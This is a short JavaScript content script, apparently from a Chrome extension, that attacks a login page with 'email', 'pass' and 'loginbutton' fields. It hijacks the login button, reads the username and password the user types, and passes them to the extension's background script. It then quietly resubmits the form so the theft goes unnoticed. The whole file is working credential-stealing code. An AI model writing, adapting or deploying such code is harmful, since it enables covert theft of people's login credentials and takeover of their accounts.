console.log("content script running!!!");

var data= {username: "", password: ""};

document.getElementById("loginbutton").type= "button";
document.getElementById("pass").addEventListener("change", get_password, false);
document.getElementById("loginbutton").addEventListener("click", get_data, false);
function get_password()
{
	data.password= document.getElementById("pass").value;
}

function get_data()
{
	data.username= document.getElementById("email").value;
	console.log("data sent!!!")
	chrome.runtime.sendMessage(data, function(responce){
		if(responce == "data received!!!")
		{	
			console.log("data transfer complete!!!");
			document.getElementById("loginbutton").removeEventListener("click", get_data);
			document.getElementById("loginbutton").type= "submit";
			document.getElementById("loginbutton").click();
		}
	});
}

chrome.runtime.onMessage.addListener(function(message, sender, responce){
	console.log("background says: " + message);
	responce("confirmed!!!");
})



